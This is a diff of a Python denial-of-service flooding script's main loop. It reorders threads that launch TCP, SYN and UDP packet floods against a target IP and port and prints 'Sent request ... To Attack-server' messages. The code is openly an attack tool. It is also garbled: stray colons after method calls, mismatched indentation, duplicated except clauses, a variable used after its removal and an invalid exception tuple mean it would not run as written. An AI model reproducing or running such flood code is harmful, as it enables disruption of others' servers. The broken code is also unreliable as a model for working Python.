@@ -104,11 +104,27 @@ while True:
     try:
         if size > 65507:
             sys.exit("Invalid Number Of Packets!")
-        u = udp(ip,port,size,packets)
         t = tcp(ip,port,size,packets)
+        t.start():
+        print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mTo Attack-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
+    except KeyboardInterrupt:
+        print ("Stopping Flood!")
+        sys.exit()
+    except ('socket.error, msg'):
+        
+        print ("Socket Couldn't Connect")
         s = syn(ip,port,packets)
-        u.start()
-        t.start()
+        s.start()
+        print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mTo Attack-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
+     except KeyboardInterrupt:
+        print ("Stopping Flood!")
+        sys.exit()
+    except ('socket.error, msg'):
+        print ("Socket Couldn't Connect")
+        sys.exit()
+     
+        u = udp(ip,port,size,packets)
+        u.start():
         print("\033[33m[\033[1m+\033[33m]\033[92mSent request   " +str(u)+ "  \033[33mTo Attack-server " +str()+ "   \033[97m" +ip+ "\033[0m" )
         s.start()
     except KeyboardInterrupt:
